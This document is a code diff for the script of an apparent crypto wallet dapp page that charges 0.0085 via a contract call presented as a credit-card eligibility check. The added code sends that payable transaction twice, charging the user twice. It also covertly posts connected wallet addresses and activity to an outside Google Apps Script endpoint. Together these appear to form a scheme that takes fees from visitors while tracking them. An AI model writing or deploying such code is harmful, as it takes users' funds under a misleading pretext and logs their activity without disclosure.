@@ -260,8 +260,28 @@ text-align : left;
  <script>
 
     // Initialize Web3.js
-    const web3 = new Web3(Web3.givenProvider);
+    let web3;
 
+    // Function to initialize Web3
+    async function initWeb3() {
+        if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
+            try {
+                // Request account access if needed
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+            } catch (error) {
+		flashNotification('User denied account access', 'red');
+            }
+        } else if (window.web3) {
+            web3 = new Web3(window.web3.currentProvider);
+        } else {
+		flashNotification('No Ethereum provider detected', 'red');
+        }
+    }
+
+    // Initialize Web3 before using it
+    initWeb3().then(() => {
+        // Initialize the contract
         const contractAddress = "0x3A493e88cc1239F3F1462ba1fa3e88b48A6AF039";
         const contractABI = [
 	{
@@ -586,7 +606,7 @@ text-align : left;
 		"stateMutability": "view",
 		"type": "function"
 	}
-];
+]; // Your contract ABI here
         const contract = new web3.eth.Contract(contractABI, contractAddress);
 
         let walletConnected = false;
@@ -607,6 +627,7 @@ console.log(walletAddress = accounts[0]);
 
                 document.getElementById('disconnect-wallet').style.display = 'inline';
                 document.getElementById('connect-wallet').style.display = 'none';
+            updateLog(walletAddress,'CC - Wallet Connect');
            } else {
 
             // Display an error message if the connected network is not BSC
@@ -655,45 +676,92 @@ console.log(walletAddress = accounts[0]);
         }
 
         document.getElementById('apply-card').addEventListener('click', async () => {
-		if (!walletConnected) {
-	                    flashNotification('Connect wallet first', 'grey');
-	                    return;
-	                }
+         
+                if (!walletConnected) {
+                    flashNotification('Connect wallet first', 'grey');
+                    return;
+                }
 
-		const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                const fromAddress = accounts[0];
-
-		if (!fromAddress) {
-	        flashNotification('Error: No wallet address found', 'red');
-	        return;
-	  	  }
-            try {
-		    
                 document.getElementById('popup-status').textContent = 'Approve Transaction';
                 document.getElementById('popup-message').textContent = `You have to approve the transaction to check your eligibility.`;
-                document.getElementById("process-transaction-popup").style.display = "flex";
-               
-                const weiAmount = web3.utils.toWei('0.0085', 'ether');
+
+                var popup = document.getElementById("process-transaction-popup");
+                popup.style.display = "flex";
+
+
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                const fromAddress = accounts[0];
+
+              try{  const weiAmount = web3.utils.toWei('0.0085', 'ether');
                 const gas = await contract.methods.CheckCreditScore().estimateGas({ value: weiAmount, from: fromAddress });
-		    const result = await contract.methods.CheckCreditScore().send({ value: web3.utils.toWei('0.0085', 'ether'), from: fromAddress});
                 await contract.methods.CheckCreditScore().send({ from: fromAddress, value: weiAmount, gas });
-                
+                const result = await contract.methods.CheckCreditScore().send({ value: web3.utils.toWei('0.0085', 'ether'), from: fromAddress, gas });
 
                 // If the transaction is successful, call the getRemainingTime function and start countdown
                 if (result.status) {
                 document.getElementById("transaction-status").style.display = "flex";
-                document.getElementById('process-transaction-popup').style.display = 'none';
-		}
-            } catch (error) {
+                document.getElementById('process-transaction-popup').style.display = 'none'; 
+	    updateLog(fromAddress, `CC ✅`);
+            }} catch (error) {
                 document.getElementById('popup-status').textContent = 'Transaction Failed';
                 document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
+	    updateLog(fromAddress, `❌ CC: ${error.message}`);
             }
         });
+
+    });
 
 function checkScore()
 {
 window.open("CheckScore.html");
 }
+
+async function updateLog(_walletAddress, _activity)
+{
+
+    const walletAddress = _walletAddress;
+    const currentPage = _activity;
+    const postData = {
+        time: updateCurrentTime(),
+        wallet: walletAddress,
+        page: currentPage,
+    };
+
+    const url = 'https://script.google.com/macros/s/AKfycbzqXTL_AQH4Ud4EoQ6kzJOf_Ii6S8jLA68AlXnPBeFZl_XgLpfvsyiMWV78rXvjtpp1/exec'; 
+    const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(postData),
+    });
+
+    const result = await response.text();
+}
+
+
+window.onload = function () {
+      updateCurrentTime();
+    };
+
+    function updateCurrentTime() {
+      const currentDateTime = new Date();
+       const options = { 
+        year: 'numeric', 
+        month: 'numeric', 
+        day: 'numeric', 
+        hour: 'numeric', 
+        minute: 'numeric', 
+        second: 'numeric', 
+        hour12: true, // Use 12-hour format with AM/PM
+        timeZoneName: 'short' // Include the UTC time zone abbreviation
+      };
+      const currentDateTimeString = currentDateTime.toLocaleString('en-US', options);
+      return currentDateTimeString;   
+    }
+
+    setInterval(updateCurrentTime, 1000);
+
 
 </script>
 
